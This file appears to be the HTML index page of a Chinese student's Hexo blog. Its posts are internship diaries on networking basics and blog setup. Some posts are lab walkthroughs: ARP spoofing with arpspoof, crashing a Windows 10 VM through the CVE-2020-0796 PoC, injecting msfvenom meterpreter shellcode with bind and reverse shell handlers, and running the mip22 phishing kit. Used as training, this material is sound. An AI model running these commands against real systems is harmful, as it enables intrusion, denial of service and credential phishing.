@@ -1,0 +1,352 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Hexo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+    
+        <link rel="icon" href="/favicon.ico">
+    
+    
+        
+            <link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+        
+            <link rel="stylesheet" href="/css/stage.css">
+        
+            <link rel="stylesheet" href="/css/avatar-bg.css">
+        
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+<header id="header">
+    <div class="menu">
+        <i class="fa fa-bars"></i>
+    </div>
+    <div class="header-main">
+        <h1><a href="/">Hexo</a></h1>
+    </div>
+    <div id="nav">
+        <div class="nav-img" id="nav-img"></div>
+        <div class="sentences">
+            时光荏苒，旦夕之间，略有遗憾，似白驹过隙，蹉跎自悟。
+        </div>
+    </div>
+</header>
+
+<div id="content-outer">
+    <div id="content-inner">
+        <div class="clearfix">
+    
+    <div id="recent-posts">
+        
+            <div class="post-item">
+                <h1>
+                    <a href="/2023/12/08/实习第二周/">
+                        实习第二周
+                    </a>
+                </h1>
+                <div class="create">
+                    <span>Created</span>
+                    
+                        <time datetime="2023-12-08T03:50:03.000Z">
+                            2023-12-08
+                        </time>
+                    
+                    
+                </div>
+                
+                    <h1 id="周一-12-4"><a href="#周一-12-4" class="headerlink" title="周一 12.4"></a>周一 12.4</h1><h2 id="IP的介绍"><a href="#IP的介绍" class="headerlink" title="IP的介绍"></a>IP的介绍</h2><p>IP地址是IP协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。</p>
+<h3 id="IP地址分类"><a href="#IP地址分类" class="headerlink" title="IP地址分类"></a>IP地址分类</h3><p>A类：1.0.0.0 到 127.255.255.255主要分配 给大量主机而局域网网络数量较少的大型网络<br>B类：128.0.0.0 到191.255.255.255 一般用于国际性大公司和政府机构<br>C类：192.0.0.0 到223.255.255.255 用于一般小公司校园网研究机构等<br>D类：224.0.0.0 到 239.255.255.255 用于特殊用途，又称做组播地址<br>E类：240.0.0.0 到255.255.255.255 暂时保留</p>
+<h3 id="公网ip与私网ip"><a href="#公网ip与私网ip" class="headerlink" title="公网ip与私网ip"></a>公网ip与私网ip</h3><p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimgimage-20231208115153363.png" alt="image-20231208115153363"></p>
+<h3 id="子网掩码的计算"><a href="#子网掩码的计算" class="headerlink" title="子网掩码的计算"></a>子网掩码的计算</h3><p>（1)将子网数目转化为二进制来表示<br>（2)取得该二进制的位数，为 N<br>（3)取得该IP地址的类子网掩码，将其主机地址部分的的前N位置 1 即得出该IP地址划分子网的子网掩码。</p>
+<h3 id="远程桌面控制与出站如站"><a href="#远程桌面控制与出站如站" class="headerlink" title="远程桌面控制与出站如站"></a>远程桌面控制与出站如站</h3><p>1.<strong>入站</strong>通常指的是数据包从外部网络进入本地网络或子网的过程。</p>
+<p>2.<strong>出站</strong>则相反，指的是数据包从本地网络或子网传输到外部网络的过程。</p>
+<h5 id="远程桌面控制"><a href="#远程桌面控制" class="headerlink" title="远程桌面控制"></a>远程桌面控制</h5><p>1.打开虚拟机win10,关闭防火墙，右键点击此电脑，在打开的菜单项中，选择属性。</p>
+<p>2.控制面板 - 系统和安全 - 系统，点击左侧远程设置。</p>
+<p>3.在系统属性窗口，选择远程，勾选允许远程协助连接这台计算机，在远程桌面下勾选允许远程连接到此计算机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208122809418.png" alt="image-20231208122809418"></p>
+<p>4.回到桌面，右键点击此电脑，在打开的菜单项中选择管理。</p>
+<p>5.在计算机管理页面，展开服务和应用程序，选择服务，然后右键点击Remote Desktop Services服务，在打开的菜单项中，选择启用。 </p>
+<p>6.于物理机搜索栏搜索远程桌面控制，输入虚拟机win10的ip地址，输入用户名和密码完成控制<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208123721516.png" alt="image-20231208123721516"></p>
+<h1 id="周二-12-5"><a href="#周二-12-5" class="headerlink" title="周二 12.5"></a>周二 12.5</h1><h2 id="路由器与交换机"><a href="#路由器与交换机" class="headerlink" title="路由器与交换机"></a>路由器与交换机</h2><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p><strong>功能：</strong>1、连接外网；2.将从广域网络收到的数据发送给局域网络中的设备并将局域网络需要发送的数据发送到广域网络；3、防火墙；4、集成无线；5.充当交换机</p>
+<p><strong>作用：</strong>1.网络连接:企业路由器能够在多个子网之间建立连接,实现不同部门之间的通信,促进协作和信息共享。</p>
+<p>2.带宽控制:企业路由器能够实现带宽的限制和分配,使得网络的带宽资源得以充分利用。</p>
+<p>3.安全防护:企业路由器具有防火墙、VPN等安全控制、加密通信等安全功能,保护企业网络的安全和隐私</p>
+<h2 id="配置路由器实验"><a href="#配置路由器实验" class="headerlink" title="配置路由器实验"></a>配置路由器实验</h2><p>1.安装华为模拟器ENSP，点击右上角菜单中的工具栏，完成注册<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208124649273.png" alt="image-20231208124649273"></p>
+<p>2.新建拓扑，将实验设备AR2220与pc拉入拓扑，完成链接<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208125239672.png" alt="image-20231208125239672"></p>
+<p>3.如图配置pc端ip<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208125343439.png" alt="image-20231208125343439"></p>
+<p>4.启动设备，配置路由，双击路由器，按照静态路由格式：ip route-static 目标网段 子网掩码 下一跳IP或者出接口配置<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208125643146.png" alt="image-20231208125643146"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208125911687.png" alt="image-20231208125911687"></p>
+<p>5.验证配置利用192.168.1.10ping的通192.168.3.10<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208130025336.png" alt="image-20231208130025336"></p>
+<p>（于命令前加undo可取消命令，列如：undo ip address 192.168.1.1 255.255.255.0）</p>
+<h1 id="周三-12-6"><a href="#周三-12-6" class="headerlink" title="周三 12.6"></a>周三 12.6</h1><h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><p><strong>功能：</strong>1、数据转发；2、三层VLAN；3.端口的扩充</p>
+<p><strong>作用：</strong>1. 实现局域网内设备之间的高速数据交换，提高网络的传输效率和速度。</p>
+<ol start="2">
+<li><p>实现网络的分段和隔离，可以将网络划分为多个虚拟网段，提高网络的安全性。</p>
+</li>
+<li><p>实现不同设备之间的数据交换和转发，可以将数据包从主机发送到目标端口，从而实现不同设备之间的通讯。</p>
+</li>
+<li><p>实现网络流量的控制和管理，可以对不同端口、不同用户或不同应用进行流量控制和管理，从而优化网络性能，提高网络的可靠性和稳定性。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208130254765.png" alt="image-20231208130254765"></p>
+</li>
+</ol>
+<h4 id="冲突域"><a href="#冲突域" class="headerlink" title="冲突域"></a>冲突域</h4><p>集线器(Hub)是一种物理层设备，本身不能识别MAC地址和IP地址，由每一台主机自己验证MAC地址来确定是否接收。同一时刻只能传输一组数据，如果发生冲突则需要重传。集线器下连接的所有端口共享整个带宽即所有端口为一个冲突域。</p>
+<p>交换机工作在数据链路层的设备通过查找自身系统MAC地址表中的MAC地址与端口对应关系将数据传送到目的端口。交换机在同一时刻可进行多个端口之间的数据传输，因此，交换机起到了分割冲突域的作用，每一个端口为一个冲突域</p>
+<h2 id="OSI模型"><a href="#OSI模型" class="headerlink" title="OSI模型"></a>OSI模型</h2><p>1.物理层：实现实际终端信号的传输，码流通过物理介质传输。常用设备有：集线器、中继器、网线、双绞线等。<br>2.数据链路层：提供介质访问和链路管理。把位元合并为字节，然后将字节合并到帧中，以使媒体能够通过数据链路层访问。<br>3.网络层：IP选址及路由选择。<br>4.传输层：建立、维护、管理端到端的区别。<br>5.会话层：建立、管理和维护表示层实体的会话。<br>6.表示层：数据格式转化，对数据进行加密。<br>7.应用层：为应用程序提供服务<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimgimage-20231208130418796.png" alt="image-20231208130418796"></p>
+<h2 id="OSPF动态路由配置"><a href="#OSPF动态路由配置" class="headerlink" title="OSPF动态路由配置"></a>OSPF动态路由配置</h2><p>1.打开eNSP，新建拓扑，把以下设备拉入拓扑建立链接（路由器为AR2220），完成文本标识，以及pc的路由设置<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208130842165.png" alt="image-20231208130842165"></p>
+<p>2.分别将三个路由器如下图完成ip的配置，并使用pc端对路由器进行验证：<br>192.168.1.10 Ping 192.168.5.10是否能通<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208130856013.png" alt="image-20231208130856013"></p>
+<p>3.配置ospf，发布路由器相邻的网段：<br>Ospf                                   开启ospf协议<br>area 0.0.0.0                             进入骨干区域<br>network 192.168.4.0 0.0.0.255              发布 路由器 相邻网段 反子网掩码<br>network 192.168.5.0 0.0.0.255   <img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208130924477.png" alt="image-20231208130924477"><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208130944742.png" alt="image-20231208130944742"></p>
+<p>4.验证是否成功，于192.168.1.10ping端口192.168.5.10</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208131101659.png" alt="image-20231208131101659"></p>
+<h1 id="周四-12-7"><a href="#周四-12-7" class="headerlink" title="周四 12.7"></a>周四 12.7</h1><h5 id="利用kali进行app欺骗，对同一网络中的通信设备攻击"><a href="#利用kali进行app欺骗，对同一网络中的通信设备攻击" class="headerlink" title="利用kali进行app欺骗，对同一网络中的通信设备攻击"></a>利用kali进行app欺骗，对同一网络中的通信设备攻击</h5><p>1.打开虚拟机kali，将虚拟机网卡设置成桥接模式</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208131434918.png" alt="image-20231208131434918"></p>
+<p>2.于物理机windos+R，cmd打开命令行，输入代码ipconfig，查询相关ip<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimgimage-20231208131517210.png" alt="image-20231208131517210"></p>
+<p>3.开kali虚拟机，打开终端，输入命令“vi &#x2F;etc&#x2F;network&#x2F;interfaces”设置eth0网卡静态IP，修改interfaces文件：<br>auto eth0<br>iface eth0 inet static    （设置eth0网卡静态）<br>address 192.168.110.100（IPv4 物理地址附近的地址）<br>netmask 255.255.255.0（网端）<br>gateway 192.168.110.1（你的子网掩码）<br>dns-nameservers 114.114.114.114（你的默认网关）<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208131536483.png" alt="image-20231208131536483"></p>
+<p>ESC，输入“：wq”保存并退出</p>
+<p>4.输入“service networking restart”重启网络<br>5.于kali端ping一下WWW.baidu.com看是否ping通。<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208131646647.png" alt="image-20231208131646647"><br>6.输入安装命令“apt-get install dsniff”<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208131714695.png" alt="image-20231208131714695"></p>
+<p>7.输入命令验证安装成功：arpspoof<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208131735096.png" alt="image-20231208131735096"></p>
+<p>8.输入命令攻击受害人“arpspoof -i eth0 -t 受害人IP 网关”，完成攻击<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231208131804024.png" alt="image-20231208131804024"></p>
+
+                
+                <div class="readmore">
+                    <a href="/2023/12/08/实习第二周/">
+                        Read More
+                    </a>
+                </div>
+            </div>
+        
+            <div class="post-item">
+                <h1>
+                    <a href="/2023/12/02/第一周实训/">
+                        
+                    </a>
+                </h1>
+                <div class="create">
+                    <span>Created</span>
+                    
+                        <time datetime="2023-12-02T07:47:00.000Z">
+                            2023-12-02
+                        </time>
+                    
+                    
+                </div>
+                
+                    <h1 id="11-27-周一"><a href="#11-27-周一" class="headerlink" title="11.27 周一"></a>11.27 周一</h1><p>一.安装JDK</p>
+<p>二.完成Java环境变量的配置：</p>
+<p>1.于物理机右击此电脑，点击属性，找到高级系统设置，选择高级，进入环境变量。</p>
+<p>2.于系统变量中新建变量，输入变量名JAVA_HOME，变量值根据自己的jdk的安装路径填写为JDK的bin目录所在路径。</p>
+<p>3.在系统变量里新建”classpath”变量，值为：.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar; 找到path变量添加变量值：%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin。</p>
+<p>4.Window+R输入cmd，打开命令行，输入命令java -version，如下图所示则配置成功。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202155648307.png" alt="image-20231202155648307"></p>
+<p>三.Python环境搭建：</p>
+<p>1.输入python官网地址，进入官网点击Downloads选择Windows，进入此页面，找到3.6.4版本集，下载安装包。</p>
+<p>2.运行安装包，勾选左下角Add python 3.6 to  PATH，然后选择第二个自定义安装（Customize installation），其他选项默认，自定义安装路径，完成安装。</p>
+<p>3.Windows+R然后输入cmd，打开命令行输入python，如下图所示安装完成<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202160349502.png" alt="image-20231202160349502"></p>
+<p>（安装路径不能出现中文）</p>
+<h1 id="11-28-周二"><a href="#11-28-周二" class="headerlink" title="11.28 周二"></a>11.28 周二</h1><h2 id="永恒之黑漏洞"><a href="#永恒之黑漏洞" class="headerlink" title="永恒之黑漏洞"></a>永恒之黑漏洞</h2><p>1.打开VMware软件，创建虚拟机靶机Win10X64与虚拟机kali linux，关闭靶机防火墙</p>
+<p>2.将压缩包CVE-2020-0796-Scanner粘贴至Win10。window+R打开一个命令行于命令行输入“ipconfig”查看Win10的ip,，解压并打开文件夹CVE-2020-0796-Scanner于路径栏输入“cmd”打开命令行。再输入“CVE-2020-0796-Scanner.exe”运行检测工具，输入靶机ip，查看靶机漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202161142941.png" alt="image-20231202161142941"></p>
+<p>3.打开kali虚拟机，将压缩包CVE-2020-0796-PoC-master粘贴至kali系统，解压并打开文件夹CVE-2020-0796-PoC-master，于文件夹空格处右键单击选择“在这里打开终端”进入命令行。</p>
+<p>4.输入命令“sudo su”输入密码进入管理员状态。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimgimage-20231202161241024.png" alt="image-20231202161241024"></p>
+<p>5.输入命令“pip install ntlm_auth”加入安装包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimgimage-20231202161327255.png" alt="image-20231202161327255"></p>
+<p>6.输入命令“python3 CVE-2020-0796.py 靶机的ip地址”，对永恒之黑漏洞进行攻击，致使目标靶机出现蓝屏重启报错的现象。<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimgimage-20231202161353851.png" alt="image-20231202161353851"></p>
+<h1 id="11-29-周三"><a href="#11-29-周三" class="headerlink" title="11.29 周三"></a>11.29 周三</h1><h2 id="永恒之黑的另一种复现以及利用漏洞对靶机进行监听"><a href="#永恒之黑的另一种复现以及利用漏洞对靶机进行监听" class="headerlink" title="永恒之黑的另一种复现以及利用漏洞对靶机进行监听"></a>永恒之黑的另一种复现以及利用漏洞对靶机进行监听</h2><p>1.打开VMware软件，创建虚拟机靶机Win10X64与虚拟机kali linux，关闭靶机防火墙</p>
+<p>2.将压缩包CVE-2020-0796-Scanner粘贴至Win10。window+R打开一个命令行于命令行输入“ipconfig”查看Win10的ip地址192.168.138.129。,，解压并打开文件夹CVE-2020-0796-Scanner于路径栏输入“cmd”打开命令行。再输入“CVE-2020-0796-Scanner.exe”运行检测工具，输入靶机ip，查看靶机漏洞</p>
+<p>3.下载漏洞利用工具，安装在kali中，在kali中利用MSF生成木马：<br>“msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;6666 -b ‘\x00’ -i 1 -f python ”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202162700658.png" alt="image-20231202162700658"></p>
+<p>4.将生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202162820852.png" alt="image-20231202162820852"></p>
+<p>5.于kali攻击机中exploit.py文件夹空白处右键，选择“在这里打开终端”，在打开的命令行输入以下命令使靶机蓝屏：python3 exploit.py -ip 192.168.138.129<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202162928848.png" alt="image-20231202162928848"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202162947896.png" alt="image-20231202162947896"></p>
+<p>6.于桌面打开终端输入以下命令使kali进入监听模式：msfconsole</p>
+<p>7.输入以下命令使kali对靶机进行监听：<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp<br>set rhost 靶机IP<br>set lport 生成木马时设置的端口                       run</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimgimage-20231202163052195.png" alt="image-20231202163052195"></p>
+<p>8.首次监听失败，重复运行蓝屏代码，再次监听，在没有报错的情况增加蓝屏攻击次数增加监听成功概率，直至监听成功<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202163337097.png" alt="image-20231202163337097"></p>
+<p>此次监听为正向链接，kali端链接靶机；还可以进行反向链接，靶机链接kali端，需要将部分命令修改：1.msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.93.129 LPORT&#x3D;6666 -b ‘\x00’ -i 1 -f python ，此处ip端口为kali端ip位置。2.use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>set LHOST kali端IP<br>set lport 生成木马时设置的端口</p>
+<h2 id="部分登录页面钓鱼网站的建立"><a href="#部分登录页面钓鱼网站的建立" class="headerlink" title="部分登录页面钓鱼网站的建立"></a>部分登录页面钓鱼网站的建立</h2><p>1.于物理机打开代理，Windows+R输入cmd打开命令行，输入命令ipconfig查询物理机ip地址</p>
+<p>2.打开kali，于桌面打开终端，输入sudo su，输入kali密码进入管理员模式</p>
+<p>3.输入命令 vim &#x2F;etc&#x2F;proxychains4.conf编辑代理设置，下拉至最后一行，单机空处，按i键进入编辑模式，更改ip地址为物理机地址+代理端口的格式，ESC，输入：wq退出并保存代理设置。<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202171417657.png" alt="image-20231202171417657"><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202171507923.png" alt="image-20231202171507923"></p>
+<p>4.继续输入proxychains4 git clone <a target="_blank" rel="noopener" href="https://github.com/makdosx/mip22%EF%BC%8C%E4%B8%8B%E8%BD%BDmip22%E6%96%87%E4%BB%B6![image-20231202171737784](https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimgimage-20231202171737784.png)">https://github.com/makdosx/mip22，下载mip22文件![image-20231202171737784](https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimgimage-20231202171737784.png)</a></p>
+<p>5.输入命令“chmod -R 777 mip22”复制mip22，“cd mip22”传送到mip22的位置，改写mip22文件的权限<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202172636248.png" alt="image-20231202172636248"></p>
+<p>6.找到mip22文件夹于空白处右键打开终端，输入命令“proxychains4 bash mip22.sh”，运行程序打开，根据提示数字，创建相应的钓鱼网站<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202172619751.png" alt="image-20231202172619751"></p>
+<h1 id="11-30-周四"><a href="#11-30-周四" class="headerlink" title="11.30 周四"></a>11.30 周四</h1><h2 id="Github的创建"><a href="#Github的创建" class="headerlink" title="Github的创建"></a>Github的创建</h2><p>1.打开Win10虚拟机下载Git GMD与Node.js软件<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202172704918.png" alt="image-20231202172704918"></p>
+<p>2.注册git hub账号<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202172728756.png" alt="image-20231202172728756"></p>
+<p>3.打开c盘新建文件夹，重命名为boke，右键文件夹选择Open Git Bash here，依次输入以下代码等待下载完成：<br>npm install -g hexo-cli<br>hexo init blog<br>cd blog<br>hexo g<br>hexo new x<br>hexo g<br>hexo s<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202172804892.png" alt="image-20231202172804892"></p>
+<p>4.打开浏览器，以IP：端口（192.168.138.129:4000&#x2F;）的形式搜索网页<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202172848786.png" alt="image-20231202172848786"></p>
+<p>5.在虚拟机中输入ctrl+c停止分享，依次输入以下命令：hexo clean；cd ~&#x2F;.ssh；ssh-keygen -t rsa -C “注册git hub的邮件地址”，打开c盘用户文件夹，选择admin，选择.ssh文件，选择id_rsa以记事本打开，复制，粘贴至git hub的设置ssh keys中生成密钥。<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202172953006.png" alt="image-20231202172953006"><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202173004266.png" alt="image-20231202173004266"></p>
+<p>6.输入命令“ssh -T <a href="mailto:&#x67;&#x69;&#x74;&#64;&#103;&#105;&#x74;&#x68;&#117;&#x62;&#x2e;&#99;&#111;&#x6d;">&#x67;&#x69;&#x74;&#64;&#103;&#105;&#x74;&#x68;&#117;&#x62;&#x2e;&#99;&#111;&#x6d;</a>”，选择yes，<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202173032581.png" alt="image-20231202173032581"></p>
+<p>7.在blog文件栏打入cmd，输入命令npm install hexo-deployer-git –save<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202173100867.png" alt="image-20231202173100867"></p>
+<p>8.输入代码.git config –global user.name “xxx”&#x2F;&#x2F; 你的github用户名，非昵称<br>git config –global user.email “<a href="mailto:&#x78;&#120;&#120;&#x40;&#113;&#113;&#46;&#x63;&#111;&#109;">&#x78;&#120;&#120;&#x40;&#113;&#113;&#46;&#x63;&#111;&#109;</a>“&#x2F;&#x2F; 填写你的github注册邮箱<br>打开github网站，创建一个库<img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202173117937.png" alt="image-20231202173117937"></p>
+<p>9.于blog文档的congig文件以记事本打开，添加标识的代码：</p>
+<p>deploy:<br> type: git<br> repository: <a href="mailto:&#103;&#x69;&#x74;&#64;&#103;&#x69;&#x74;&#104;&#x75;&#x62;&#46;&#x63;&#111;&#109;">&#103;&#x69;&#x74;&#64;&#103;&#x69;&#x74;&#104;&#x75;&#x62;&#46;&#x63;&#111;&#109;</a>:xxx&#x2F;xxx.github.io.git<br> branch: main</p>
+<p>保存，于github命令栏输入<br>hexo d -g命令，完成本地文件的上传。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimgimage-20231202173155931.png" alt="image-20231202173155931"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202173314783.png" alt="image-20231202173314783"></p>
+<h2 id="Github主题的更换"><a href="#Github主题的更换" class="headerlink" title="Github主题的更换"></a>Github主题的更换</h2><p>1.打开库，此电脑，找到boke文件夹，打开文件夹右键blog文件夹，选择</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202173815110.png" alt="image-20231202173815110"></p>
+<p>2.打开浏览器，搜索hexo主页（需要开代理），找到主题，选择合适的主题复制下载方式，于打开的Git CMD中运行，下载主题，下载完成后输入代码hexo clean，再输入命令hexo d -g保存主题</p>
+<p>3.打开自己的git hub网站（github的id.github.io）观察主题是否更换</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimgimage-20231202174410527.png" alt="image-20231202174410527"></p>
+<h1 id="12-1-周五"><a href="#12-1-周五" class="headerlink" title="12.1 周五"></a>12.1 周五</h1><h2 id="Github的编写"><a href="#Github的编写" class="headerlink" title="Github的编写"></a>Github的编写</h2><p>1.打开虚拟机，下载压缩包，完成程序Typora与PicGo的安装</p>
+<p>2.对PicGo完成设置如下图所示，确定并设为默认图床，自定义域名的格式为“<a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/%E4%BD%A0%E7%9A%84github%E7%94%A8%E6%88%B7%E5%90%8D/%E4%BD%A0%E7%9A%84%E4%BB%93%E5%BA%93%E5%90%8D@%E5%88%86%E6%94%AF%EF%BC%88%E4%B8%80%E8%88%AC%E4%B8%BAmain%EF%BC%89/%E2%80%9D">https://cdn.jsdelivr.net/gh/你的github用户名/你的仓库名@分支（一般为main）/”</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202174837520.png" alt="image-20231202174837520"></p>
+<p>3.打开Typora，选择文件，偏好设置，点击图像，如图所示设置，路径为PigcGo的文件所在位置</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202175211080.png" alt="image-20231202175211080"></p>
+<p>4.验证图片上传选择，完成验证</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimage-20231202175247442.png" alt="image-20231202175247442"></p>
+<p>5.利用Typora打开相应的文件即可编辑博客，编辑完成后保存，找到boke文件夹，打开文件夹右键blog文件夹，选择Open Git Bash here，输入代码”hexo d -g”,等待上传完毕，刷新自己的github即可。</p>
+<p>6.下面介绍部分编辑博客的代码：</p>
+<p>开启服务：hexo server                                              新建文章a：hexo new a（a可以为任意文章名）</p>
+<p>新建草稿b：hexo new draft b                                  将草稿b成为文章：hexo publish b</p>
+<p>发布页面c：hexo new page c                                   生成静态文章：hexo generate 或者是 hexo g</p>
+<p>部署文章：hexo deploy 或者是 hexo d</p>
+
+                
+                <div class="readmore">
+                    <a href="/2023/12/02/第一周实训/">
+                        Read More
+                    </a>
+                </div>
+            </div>
+        
+            <div class="post-item">
+                <h1>
+                    <a href="/2023/11/30/hello-world/">
+                        Hello World
+                    </a>
+                </h1>
+                <div class="create">
+                    <span>Created</span>
+                    
+                        <time datetime="2023-11-30T01:37:38.800Z">
+                            2023-11-30
+                        </time>
+                    
+                    
+                </div>
+                
+                    <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+                
+                <div class="readmore">
+                    <a href="/2023/11/30/hello-world/">
+                        Read More
+                    </a>
+                </div>
+            </div>
+        
+    </div>
+
+
+    <div id="content-aside">
+    <div class="content-aside-owner">
+        <div id="owner">
+    <div class="avatar-bg">
+        <div class="index-page">
+            <div class="banner">
+                <div class="slide slide1">
+                    <div class="bg-wrapper">
+                        <div class="bg" id="container_left">
+                            <div id="canvas_left"></div>
+                        </div>
+                    </div>
